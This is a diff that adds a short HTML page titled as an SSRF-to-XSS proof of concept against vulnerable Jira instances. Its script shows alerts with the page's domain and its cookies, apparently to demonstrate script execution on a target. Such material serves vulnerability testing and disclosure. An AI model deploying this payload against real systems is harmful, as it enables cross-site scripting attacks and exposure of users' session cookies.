@@ -1,0 +1,12 @@
+<html>
+  <head>
+    <title>SSRF to XSS on Jira Vulnerable Instances
+    </title>
+  </head>
+  <body>
+  <script>
+   alert( document.domain + " is vulnerable" );
+            alert( document.cookie);
+    </script>
+  </body>
+</html>
